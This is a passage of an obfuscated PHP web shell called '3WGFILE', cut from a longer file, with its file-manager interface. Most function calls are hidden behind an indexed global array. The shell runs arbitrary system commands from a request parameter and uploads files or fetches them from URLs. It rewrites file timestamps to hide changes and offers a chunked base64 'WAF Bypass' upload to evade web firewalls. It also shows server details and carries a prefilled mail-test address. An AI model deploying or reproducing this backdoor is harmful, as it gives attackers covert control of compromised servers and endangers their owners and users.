        $content = $GLOBALS['_q_'][37]($GLOBALS['_q_'][48]($item_path));
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
} elseif ($action === 'zip' || $action === 'unzip') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $item = decodePath($_GET['item']);
    if ($action === 'zip') {
        $zip_file = $item . '.zip';
        if (zipFolder($item, $zip_file)) {
            echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => "Zipped successfully to {$zip_file}"));
        } else {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'Failed to create zip.'));
        }
    } elseif ($action === 'unzip') {
        $ext = $GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item, PATHINFO_EXTENSION));
        if ($ext !== 'zip') {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'Not a zip file.'));
            exit;
        }
        $result = unzipFile($item, $GLOBALS['_q_'][34]($item));
        if ($result === true) {
            echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => 'Unzipped successfully.'));
        } else {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => $result));
        }
    }
    exit;
} elseif ($action === 'cmd') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $command = isset($_GET['command']) ? $_GET['command'] : '';
    if ($command) {
        $output = executeCommand($command);
        echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => $GLOBALS['_q_'][37]($output)));
    } else {
        echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'No command provided'));
    }
    exit;
}
// --- NEW ACTION: Handle search requests --- //
elseif ($action === 'search') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $query = isset($_GET['query']) ? $_GET['query'] : '';
    $base_path = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();

    if (!empty($query)) {
        $results = searchItemsRecursive($base_path, $query);
        // Encode parent directory path for each result
        foreach ($results as $key => $result) {
            $results[$key]['parent_dir_encoded'] = encodePath($result['parent_dir']);
        }
        echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => $results));
    } else {
        echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'No search query provided'));
    }
    exit;
}
// --- END NEW ACTION --- //

$path_parts = $GLOBALS['_q_'][52]('/', $GLOBALS['_q_'][39]($PATH));
$current_path_encoded = encodePath($PATH);
$script_directory = $GLOBALS['_q_'][34]($_SERVER['SCRIPT_FILENAME']);
$home_path_encoded = encodePath($script_directory);
$items = getDirContents($PATH);
$folders = array();
$files = array();
foreach ($items as $item) {
    if ($item['is_dir']) $folders[] = $item;
    else $files[] = $item;
}
$GLOBALS['_q_'][53]($folders);
$GLOBALS['_q_'][53]($files);
$sorted_items = $GLOBALS['_q_'][54]($folders, $files);
$is_writable = $GLOBALS['_q_'][36]($PATH);
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$user_ip = $_SERVER['REMOTE_ADDR'];
$php_version = $GLOBALS['_q_'][81]();
$uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3WGF - <?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
    <meta name="robots" content="nofollow, noindex" />
    <link rel="icon" type="images/x-icon" href="https://brave.com/favicon.ico" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color: #111827;
            color: #d1d5db;
        }

        .modal {
            display: none;
        }

        .modal.active {
            display: flex;
        }

        .fade-in-out {
            animation: fadeInOut 4s forwards;
        }

        @keyframes fadeInOut {
            0% {
                opacity: 0;
                transform: translateY(-20px);
            }

            10% {
                opacity: 1;
                transform: translateY(0);
            }

            90% {
                opacity: 1;
                transform: translateY(0);
            }

            100% {
                opacity: 0;
                transform: translateY(-20px);
            }
        }

        .icon-sm {
            width: 1.1rem;
            height: 1.1rem;
        }

        .icon-md {
            width: 1.25rem;
            height: 1.25rem;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            font-weight: 600;
            transition: background-color 0.2s;
        }

        .btn-blue {
            background-color: #3b82f6;
            color: white;
        }

        .btn-blue:hover {
            background-color: #2563eb;
        }

        .btn-green {
            background-color: #22c55e;
            color: white;
        }

        .btn-green:hover {
            background-color: #16a34a;
        }

        .btn-yellow {
            background-color: #eab308;
            color: white;
        }

        .btn-yellow:hover {
            background-color: #ca8a04;
        }

        .btn-gray {
            background-color: #6b7280;
            color: white;
        }

        .btn-gray:hover {
            background-color: #4b5563;
        }

        .btn-red {
            background-color: #ef4444;
            color: white;
        }

        .btn-red:hover {
            background-color: #dc2626;
        }

        .btn-orange {
            background-color: #f97316;
            color: white;
        }

        .btn-orange:hover {
            background-color: #ea580c;
        }

        .path-display {
            word-break: break-all;
        }

        select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23d1d5db%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E');
            background-repeat: no-repeat;
            background-position: right 0.7rem center;
            background-size: .65em auto;
            padding-right: 2.5rem;
        }
    </style>
</head>

<body class="font-sans">
    <?php display_message(); ?>
    <div class="container mx-auto p-2 sm:p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4 relative">
            <div class="flex justify-between items-start">
                <div class="flex-shrink min-w-0">
                    <h1 class="hidden md:block text-xl sm:text-2xl text-white font-bold">
                        <pre>
▄▖▖  ▖▄▖▄▖▄▖▖ ▄▖
▄▌▌▞▖▌▌ ▙▖▐ ▌ ▙▖
▄▌▛ ▝▌▙▌▌ ▟▖▙▖▙▖
</pre>
                    </h1>
                    <h1 class="block md:hidden text-2xl text-white font-bold py-3">3WGFILE</h1>
                    <p class="text-xs sm:text-sm text-gray-400">Server: <?= $server_ip ?> | Client: <?= $user_ip ?> |
                        PHP: <?= $php_version ?></p>
                    <div class="text-xs sm:text-sm text-gray-400 truncate">OS: <?= $GLOBALS['_q_'][37]($uname) ?></div>
                </div>
                <div class="relative flex-shrink-0">
                    <button id="hamburger-menu-button" class="text-gray-300 hover:text-white focus:outline-none p-2 mt-2">
                        <i class="fas fa-bars fa-lg"></i>
                    </button>
                    <div id="mobile-menu"
                        class="hidden opacity-0 scale-95 absolute right-0 mt-2 w-56 bg-gray-700 rounded-lg shadow-xl z-50 transition-all duration-200 ease-out transform origin-top-right">
                        <div class="py-1">
                            <a href="?p=<?= $home_path_encoded ?>"
                                class="flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600 rounded-t-lg"><i
                                    class="fas fa-home w-5 text-center"></i>Home</a>
                            <button onclick="showModalAndCloseMenu('upload')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-upload w-5 text-center"></i>Upload</button>
                            <button onclick="showModalAndCloseMenu('download_url')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-cloud-download-alt w-5 text-center"></i>URL</button>
                            <button onclick="showModalAndCloseMenu('search')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-search w-5 text-center"></i>Search</button>
                            <button onclick="showModalAndCloseMenu('create_folder')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-folder-plus w-5 text-center"></i>Folder</button>
                            <button onclick="showModalAndCloseMenu('create_file')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-file-alt w-5 text-center"></i>File</button>
                            <button onclick="showModalAndCloseMenu('cmd')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-terminal w-5 text-center"></i>CMD</button>
                            <button onclick="showModalAndCloseMenu('mail_test')"
                                class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                                    class="fas fa-envelope w-5 text-center"></i>Test Mail</button>
                            <?php if ($auth_enabled): ?>
                                <div class="border-t border-gray-600 my-1"></div>
                                <a href="?logout=true"
                                    class="flex items-center gap-3 px-4 py-3 text-sm text-red-400 hover:bg-gray-600 rounded-b-lg"><i
                                        class="fas fa-sign-out-alt w-5 text-center"></i>Logout</a>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mt-3 flex items-start gap-2 text-sm text-gray-300 flex-wrap">
                <span class="w-3 h-3 rounded-full flex-shrink-0 <?= $is_writable ? 'bg-green-400' : 'bg-red-500' ?>"
                    title="<?= $is_writable ? 'Writable' : 'Not Writable' ?>"></span>
                <span class="font-semibold flex-shrink-0">Path:</span>
                <div class="flex-grow path-display">
                    <?php
                    $cumulative_path = '';
                    $path_parts = $GLOBALS['_q_'][52](DIRECTORY_SEPARATOR, $GLOBALS['_q_'][39]($PATH));
                    echo '<a href="?p=' . encodePath($path_parts[0] ? $path_parts[0] : '/') . '" class="text-blue-400 hover:underline">' . ($path_parts[0] ? $GLOBALS['_q_'][37]($path_parts[0]) : 'Root') . '</a>';
                    $cumulative_path = $path_parts[0];
                    unset($path_parts[0]);
                    foreach ($path_parts as $part) {
                        if (empty($part)) continue;
                        $cumulative_path .= DIRECTORY_SEPARATOR . $part;
                        echo '<span class="text-gray-500">/</span><a href="?p=' . encodePath($cumulative_path) . '" class="text-blue-400 hover:underline">' . $GLOBALS['_q_'][37]($part) . '</a>';
                    }
                    ?>
                </div>
            </div>
        </div>

        <?php if ($action === 'view'): ?>
            <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4">
                <h2 class="text-xl text-white font-bold mb-2">Viewing:
                    <?= $GLOBALS['_q_'][37]($GLOBALS['_q_'][41]($item_path)) ?></h2>
                <form method="POST">
                    <input type="hidden" name="action" value="edit_file">
                    <input type="hidden" name="file_path" value="<?= $GLOBALS['_q_'][37]($item_path) ?>">
                    <textarea name="content"
                        class="w-full h-96 bg-gray-900 text-white p-2 rounded font-mono text-sm"><?= $content ?></textarea>
                    <div class="mt-4 flex gap-2">
                        <button type="submit" class="btn btn-blue"><i class="fas fa-save icon-md"></i>Save</button>
                        <a href="?p=<?= $current_path_encoded ?>" class="btn btn-gray"><i
                                class="fas fa-arrow-left icon-md"></i>Back</a>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <form id="bulk-action-form" method="POST">
                <input type="hidden" name="action" value="bulk_action">
                <input type="hidden" name="bulk_operation" id="bulk-operation" value="">
                <input type="hidden" name="destination_folder" id="destination-folder-input" value="">

                <div class="overflow-x-auto bg-gray-800 rounded-lg shadow-xl">
                    <table class="w-full min-w-[800px] text-sm">
                        <thead class="bg-gray-700/50">
                            <tr>
                                <th class="p-3 w-8"><input type="checkbox" id="select-all-checkbox"
                                        class="bg-gray-900 border-gray-600 rounded"></th>
                                <th class="p-3 text-left font-semibold text-gray-300">Name</th>
                                <th class="p-3 text-left font-semibold text-gray-300">Size</th>
                                <th class="p-3 text-left font-semibold text-gray-300">Perms</th>
                                <th class="p-3 text-left font-semibold text-gray-300">Modified</th>
                                <th class="p-3 text-left font-semibold text-gray-300">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-gray-700">
                            <?php if (getParentPath($PATH)): ?>
                                <tr>
                                    <td class="p-3" colspan="6">
                                        <a href="?p=<?= encodePath(getParentPath($PATH)) ?>"
                                            class="flex items-center gap-2 text-blue-400 hover:underline">
                                            <i class="fas fa-level-up-alt h-5 w-5"></i>
                                            ..
                                        </a>
                                    </td>
                                </tr>
                            <?php endif; ?>

                            <?php foreach ($sorted_items as $item):
                                $item_path_encoded = encodePath($item['path']);
                                $is_item_dir = $item['is_dir'];
                                $perms = getPerms($item['path']);
                                $item_is_writable = $is_item_dir ? $GLOBALS['_q_'][36]($item['path']) : false;
                                $icon_color = $is_item_dir && !$item_is_writable ? 'text-red-400' : 'text-blue-400';
                            ?>
                                <tr class="hover:bg-gray-700/50 item-row" data-path="<?= $item_path_encoded ?>"
                                    data-name="<?= $GLOBALS['_q_'][37]($item['name']) ?>" data-is-dir="<?= $is_item_dir ? '1' : '0' ?>">
                                    <td class="p-3 text-center"><input type="checkbox" name="selected_items[]"
                                            value="<?= $item_path_encoded ?>" class="item-checkbox bg-gray-900 border-gray-600 rounded"></td>
                                    <td class="p-3">
                                        <a href="<?= $is_item_dir ? '?p=' . $item_path_encoded : '?action=view&item=' . $item_path_encoded . '&p=' . $current_path_encoded ?>"
                                            class="flex items-center gap-2 <?= $icon_color ?> hover:underline">
                                            <i class="icon-md flex-shrink-0 <?= $is_item_dir ? 'fas fa-folder' : 'fas fa-file-alt' ?>"></i>
                                            <span class="truncate"><?= $GLOBALS['_q_'][37]($item['name']) ?></span>
                                        </a>
                                    </td>
                                    <td class="p-3 whitespace-nowrap">
                                        <?= $is_item_dir ? '-' : formatSize($GLOBALS['_q_'][55]($item['path'])) ?></td>
                                    <td class="p-3 whitespace-nowrap">
                                        <a href="#" onclick="showChmodModal('<?= $item_path_encoded ?>', '<?= $perms ?>')"
                                            class="font-mono text-yellow-400 hover:underline"><?= $perms ?></a>
                                    </td>
                                    <td class="p-3 whitespace-nowrap">
                                        <?= $GLOBALS['_q_'][56]('Y-m-d H:i', $GLOBALS['_q_'][57]($item['path'])) ?></td>
                                    <td class="p-3 whitespace-nowrap flex items-center gap-x-3">
                                        <a href="?action=download&item=<?= $item_path_encoded ?>" class="text-green-400 hover:underline"
                                            title="Download"><i class="fas fa-download"></i></a>
                                        <a href="#" onclick="showRenameModal('<?= $GLOBALS['_q_'][37]($item['name']) ?>')"
                                            class="text-blue-400 hover:underline" title="Rename"><i class="fas fa-edit"></i></a>
                                        <a href="#"
                                            onclick="showTouchModal('<?= $item_path_encoded ?>', '<?= $GLOBALS['_q_'][37]($item['name']) ?>')"
                                            class="text-purple-400 hover:underline" title="Edit Timestamp"><i class="fas fa-clock"></i></a>
                                        <a href="?action=delete&item=<?= $item_path_encoded ?>&p=<?= $current_path_encoded ?>"
                                            onclick="return confirm('Are you sure?')" class="text-red-400 hover:underline" title="Delete"><i
                                                class="fas fa-trash-alt"></i></a>

                                        <?php if (!$is_item_dir):
                                            $path_without_root = $GLOBALS['_q_'][84]($_SERVER['DOCUMENT_ROOT'], '', $item['path']); // str_replace()
                                            $web_path = $GLOBALS['_q_'][84](DIRECTORY_SEPARATOR, '/', $path_without_root); // str_replace()
                                        ?>
                                            <a href="<?= $web_path ?>" target="_blank" class="text-cyan-400 hover:underline"
                                                title="Run/View in New Tab"><i class="fas fa-eye"></i></a>

                                            <?php if ($GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item['path'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                                <a href="#" onclick="unzipItem('<?= $item_path_encoded ?>'); return false;"
                                                    class="text-orange-400 hover:underline" title="Unzip"><i class="fas fa-file-archive"></i></a>
                                            <?php endif; ?>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <div class="bg-gray-800 rounded-b-lg shadow-xl p-3 mt-0 flex items-center gap-3">
                    <select id="bulk-action-select"
                        class="bg-gray-700 border border-gray-600 text-white text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-auto p-2">
                        <option value="" selected disabled>Choose Action&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                        <option value="copy">Copy</option>
                        <option value="move">Move</option>
                        <option value="zip">Zip</option>
                        <option value="delete">Delete</option>
                    </select>
                    <button type="button" id="bulk-apply-btn" class="btn btn-blue text-sm">Apply</button>
                </div>
            </form>
        <?php endif; ?>
    </div>

    <div id="bulk-move-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 id="bulk-modal-title" class="text-xl text-white font-bold mb-4">Move/Copy Selected Items</h2>
            <div>
                <label for="destination_folder" class="block text-sm font-medium text-gray-300 mb-1">Destination Folder
                    Path:</label>
                <input type="text" id="destination_folder" name="destination_folder_display"
                    placeholder="e.g., /var/www/html/backup" class="w-full bg-gray-900 text-white p-2 rounded"
                    value="<?= $GLOBALS['_q_'][37]($PATH) ?>">
                <p class="text-xs text-gray-400 mt-1">Enter the absolute path of the destination folder.</p>
            </div>
            <div class="mt-4 flex justify-end gap-2">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                <button type="button" id="confirm-bulk-action" class="btn btn-blue">Confirm</button>
            </div>
        </div>
    </div>
    <div id="upload-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Upload Files</h2>

            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="files[]" multiple
                    class="block w-full text-sm text-gray-300 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100" />
                <div class="mt-4 flex justify-end">
                    <button type="submit" class="btn btn-blue w-full justify-center">Standard Upload</button>
                </div>
            </form>

            <div class="border-t border-gray-600 my-4 pt-4">
                <h3 class="text-xl text-white font-bold mb-4">WAF Bypass</h3>
                <input type="file" id="spa-file-input"
                    class="block w-full text-sm text-gray-300 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100" />

                <div id="spa-progress-container" class="w-full bg-gray-700 rounded-full h-2.5 mt-3 hidden">
                    <div id="spa-progress-bar" class="bg-yellow-400 h-2.5 rounded-full" style="width: 0%"></div>
                </div>
                <div id="spa-status" class="text-xs text-center mt-1 text-gray-300 font-mono"></div>

                <div class="mt-4 flex justify-end">
                    <button type="button" onclick="startSpaUpload()" class="btn btn-blue w-full justify-center">Bypass
                        Upload</button>
                </div>

                <div class="mt-4 flex justify-end">
                    <button type="button" class="btn btn-gray w-full justify-center" onclick="hideAllModals()">Cancel</button>
                </div>

            </div>
        </div>
        <script>
            function startSpaUpload() {
                const fileInput = document.getElementById('spa-file-input');
                const file = fileInput.files[0];

                if (!file) {
                    alert('Silakan pilih file terlebih dahulu!');
                    return;
                }

                // Konfigurasi Chunk
                const chunkSize = 256 * 1024; // 256KB per chunk (lebih kecil lebih aman dari WAF)
                const totalChunks = Math.ceil(file.size / chunkSize);
                let currentChunk = 0;

                // UI Elements
                const statusDiv = document.getElementById('spa-status');
                const progressContainer = document.getElementById('spa-progress-container');
                const progressBar = document.getElementById('spa-progress-bar');

                progressContainer.classList.remove('hidden');
                statusDiv.innerHTML = 'Initializing upload...';

                // Fungsi Upload Recursive
                function uploadNextChunk() {
                    const start = currentChunk * chunkSize;
                    const end = Math.min(start + chunkSize, file.size);
                    const blob = file.slice(start, end);
                    const reader = new FileReader();

                    reader.onload = function(e) {
                        const rawData = e.target.result.split(',')[1]; // Ambil data Base64 murni

                        const formData = new FormData();
                        formData.append('action', 'spa_upload');
                        // Inject variabel PHP current_path_encoded ke JS
                        formData.append('path', '<?= $current_path_encoded ?>');
                        formData.append('filename', file.name);
                        formData.append('chunk', rawData);

                        fetch('<?= $_SERVER["PHP_SELF"] ?>', {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.text())
                            .then(res => {
                                // Trim whitespace dari response server
                                if (res.trim() === '1') {
                                    currentChunk++;
                                    const percent = Math.round((currentChunk / totalChunks) * 100);
                                    progressBar.style.width = percent + '%';
                                    statusDiv.innerText = `Uploading: ${percent}% (${currentChunk}/${totalChunks})`;

                                    if (currentChunk < totalChunks) {
                                        // Upload chunk berikutnya
                                        uploadNextChunk();
                                    } else {
                                        statusDiv.innerText = 'Upload Success! Reloading...';
                                        statusDiv.classList.add('text-green-400');
                                        setTimeout(() => window.location.reload(), 1500);
                                    }
                                } else {
                                    statusDiv.innerText = 'Error: Gagal menulis file. Cek permission folder.';
                                    statusDiv.classList.add('text-red-400');
                                    console.log('Server response:', res);
                                }
                            })
                            .catch(err => {
                                statusDiv.innerText = 'Network/Connection Error.';
                                console.error(err);
                            });
                    };

                    reader.readAsDataURL(blob);
                }

                // Mulai proses
                uploadNextChunk();
            }
        </script>
    </div>
    <div id="create_file-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New File</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="name" placeholder="File name" class="w-full bg-gray-900 text-white p-2 rounded"
                    required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>
    <div id="create_folder-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New Folder</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="name" placeholder="Folder name" class="w-full bg-gray-900 text-white p-2 rounded"
                    required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>
    <div id="rename-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Rename Item</h2>
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="rename-old-name">
                <input type="text" name="new_name" id="rename-new-name" class="w-full bg-gray-900 text-white p-2 rounded"
                    required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Rename</button>
                </div>
            </form>
        </div>
    </div>
    <div id="chmod-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Change Permissions</h2>
            <form method="GET">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="item" id="chmod-item-path">
                <input type="hidden" name="p" value="<?= $current_path_encoded ?>">
                <input type="text" name="perms" id="chmod-perms" class="w-full bg-gray-900 text-white p-2 rounded font-mono"
                    required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Set</button>
                </div>
            </form>
        </div>
    </div>
    <div id="touch-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Edit Timestamp</h2>
            <form method="POST">
                <input type="hidden" name="action" value="touch">
                <input type="hidden" name="item" id="touch-item-path">
                <p id="touch-item-name" class="text-gray-300 mb-2 truncate font-mono text-sm"></p>

                <label class="block text-gray-400 text-xs mb-1">Format: YYYY-MM-DD HH:MM</label>
                <input type="text" name="time" id="touch-time-input"
                    class="w-full bg-gray-900 text-white p-2 rounded font-mono text-lg tracking-wide"
                    placeholder="2025-12-26 11:08" autocomplete="off" required>

                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Update</button>
                </div>
            </form>
        </div>
    </div>
    <div id="cmd-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-2xl h-3/4 flex flex-col">
            <h2 class="text-xl text-white font-bold mb-4">Execute Command</h2>
            <div id="cmd-output"
                class="flex-grow bg-gray-900 text-white p-2 rounded overflow-y-auto mb-2 font-mono text-sm whitespace-pre-wrap">
            </div>
            <div class="flex gap-2">
                <input type="text" id="cmd-input" placeholder="Enter command"
                    class="flex-grow bg-gray-900 text-white p-2 rounded-lg">
            </div>
            <div class="flex gap-2 mt-2 justify-end">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
                <button id="cmd-execute" class="btn btn-blue">Execute</button>
            </div>
        </div>
    </div>
    <div id="download_url-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Download File from URL</h2>
            <form method="POST">
                <input type="hidden" name="action" value="download_url">
                <input type="text" name="url" placeholder="Enter file URL"
                    class="w-full bg-gray-900 text-white p-2 rounded mb-3" required>
                <input type="text" name="filename" placeholder="Save as (e.g., file.zip)"
                    class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Download</button>
                </div>
            </form>
        </div>
    </div>
    <div id="mail_test-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Mail Tester</h2>
            <form method="POST">
                <input type="hidden" name="action" value="mail_test">
                <label for="to_email" class="block text-sm font-medium text-gray-300 mb-1">Recipient Email:</label>
                <input type="email" name="to_email" id="to_email" value="zerosec235@gmail.com"
                    class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Send Test</button>
                </div>
            </form>
        </div>
    </div>
    <div id="search-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-2xl h-3/4 flex flex-col">
            <h2 class="text-xl text-white font-bold mb-4">Search in current directory</h2>
            <div class="flex gap-2 mb-4">
                <input type="text" id="search-query-input" placeholder="Enter file or folder name..."
                    class="flex-grow bg-gray-900 text-white p-2 rounded-lg">
            </div>
            <div id="search-results-container"
                class="flex-grow bg-gray-900 text-white p-2 rounded overflow-y-auto font-mono text-sm">
                <p class="text-gray-500">Enter a query and press Search.</p>
            </div>
            <div class="flex gap-2 mt-4 justify-end">
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
                <button id="execute-search-btn" class="btn btn-blue">Search</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // --- Existing Modal and Helper Functions ---
            const modals = document.querySelectorAll('.modal');

            function hideAllModals() {
                modals.forEach(function(m) {
                    m.classList.remove('active');
                });
            }
            window.showModal = function(id) {
                hideAllModals();
                const modal = document.getElementById(id + '-modal');
                if (modal) modal.classList.add('active');
            };
            window.hideAllModals = hideAllModals;
            window.showRenameModal = function(oldName) {
                document.getElementById('rename-old-name').value = oldName;
                document.getElementById('rename-new-name').value = oldName;
                showModal('rename');
            }
            window.showChmodModal = function(itemPath, perms) {
                document.getElementById('chmod-item-path').value = itemPath;
                document.getElementById('chmod-perms').value = perms;
                showModal('chmod');
            }
            window.showTouchModal = function(itemPath, itemName) {
                document.getElementById('touch-item-path').value = itemPath;
                document.getElementById('touch-item-name').innerText = itemName;

                // Buat object Date
                const now = new Date();

                // Format manual ke YYYY-MM-DD HH:MM
                const y = now.getFullYear();
                const m = String(now.getMonth() + 1).padStart(2, '0');
                const d = String(now.getDate()).padStart(2, '0');
                const h = String(now.getHours()).padStart(2, '0');
                const i = String(now.getMinutes()).padStart(2, '0');

                const formattedTime = `${y}-${m}-${d} ${h}:${i}`;

                // Set ke input text
                document.getElementById('touch-time-input').value = formattedTime;

                showModal('touch');
            }
            window.unzipItem = function(itemPath) {
                if (confirm('Unzip this file?')) {
                    alert('Unzipping... please wait.');
                    fetch('?action=unzip&item=' + itemPath + '&p=<?= $current_path_encoded ?>')
                        .then(function(response) {
                            return response.json();
                        })
                        .then(function(result) {
                            if (result.status === 'success') {
                                alert('Unzipped successfully!');
                                window.location.reload();
                            } else {
                                alert('Error: ' + result.data);
                            }
                        })
                        .catch(function(e) {
                            alert('Failed to unzip file.');
                        });
                }
            };

            // --- CMD ---
